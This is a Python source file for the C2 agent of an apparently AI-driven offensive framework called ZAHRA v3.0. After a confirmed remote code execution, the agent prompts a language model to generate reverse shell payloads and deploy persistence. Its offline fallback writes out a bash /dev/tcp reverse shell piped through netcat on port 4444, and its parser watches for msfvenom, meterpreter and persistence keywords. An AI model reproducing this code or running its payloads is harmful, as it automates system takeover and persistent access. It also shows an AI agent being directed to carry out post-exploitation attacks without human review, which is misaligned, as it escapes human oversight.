"""C2 Agent — Command & Control agent for ZAHRA v3.0.

This agent is triggered after a successful exploit (RCE) and:
1. Generates reverse shell payloads (msfvenom, netcat, python)
2. Deploys persistence mechanisms
3. Establishes command & control channels
4. Performs data exfiltration (simulated)
"""

from __future__ import annotations

import logging
import re
from typing import Any

from agents.base_agent import AgentContext, BaseAgent
from core.memory import Finding

logger = logging.getLogger("zahra.agents.c2")


class C2Agent(BaseAgent):
    """Command & Control agent — deploys reverse shells and persistence."""

    def __init__(
        self,
        *,
        llm_wrapper: Any | None = None,
        max_iterations: int = 10,
    ) -> None:
        super().__init__(
            "c2_agent",
            llm_wrapper=llm_wrapper,
            max_iterations=max_iterations,
            max_concurrency=1,
        )

    def get_system_prompt(self) -> str:
        from ai_engine.prompt_engineer import PromptEngineer
        return PromptEngineer().get_prompt("c2")

    def get_initial_instruction(self, ctx: AgentContext) -> str:
        target = ctx.target
        prev_findings = self._build_context_from_findings(ctx.findings)

        return f"""Target: {target}

Previous findings: {prev_findings}

A successful exploit has been confirmed. Begin C2 operations NOW.
Generate reverse shell payloads and deploy persistence.
Respond with JSON only."""

    def _offline_command(self, target: str) -> str:
        """Offline C2 command — generate a netcat reverse shell."""
        return f"echo 'bash -i >& /dev/tcp/{target}/4444 0>&1' | nc {target} 4444"

    def parse_findings(self, target: str, llm_response: str) -> list[Finding]:
        """Parse C2 findings from LLM response."""
        findings: list[Finding] = []

        import json as json_module
        json_match = re.search(r"```json\s*(.*?)\s*```", llm_response, re.DOTALL)
        if json_match:
            try:
                data = json_module.loads(json_match.group(1))
                for item in data.get("findings", []):
                    findings.append(
                        self.make_finding(
                            agent_name=self.name,
                            finding_type=item.get("type", "c2"),
                            target=target,
                            severity=item.get("severity", "critical"),
                            description=item.get("description", ""),
                            evidence=item.get("evidence", ""),
                            confidence=item.get("confidence", 0.9),
                            metadata=item.get("metadata", {}),
                        )
                    )
                return findings
            except (json_module.JSONDecodeError, KeyError):
                logger.warning("failed to parse JSON findings from C2 response")

        # Fallback: detect C2 patterns
        for line in llm_response.splitlines():
            line = line.strip()
            if not line:
                continue

            # Detect reverse shell
            if any(kw in line.lower() for kw in ["reverse", "shell", "nc ", "netcat", "msfvenom", "meterpreter"]):
                findings.append(
                    self.make_finding(
                        agent_name=self.name,
                        finding_type="c2",
                        target=target,
                        severity="critical",
                        description=f"C2 payload: {line[:200]}",
                        evidence=line,
                        confidence=0.9,
                        metadata={"type": "reverse_shell"},
                    )
                )

            # Detect persistence
            if any(kw in line.lower() for kw in ["persistence", "cron", "registry", "service", "startup"]):
                findings.append(
                    self.make_finding(
                        agent_name=self.name,
                        finding_type="c2",
                        target=target,
                        severity="high",
                        description=f"Persistence: {line[:200]}",
                        evidence=line,
                        confidence=0.85,
                        metadata={"type": "persistence"},
                    )
                )

        if not findings:
            findings.append(
                self.make_finding(
                    agent_name=self.name,
                    finding_type="c2",
                    target=target,
                    severity="info",
                    description=f"C2 summary: {llm_response[:500]}",
                    evidence=llm_response[:1000],
                    confidence=0.6,
                )
            )

        return findings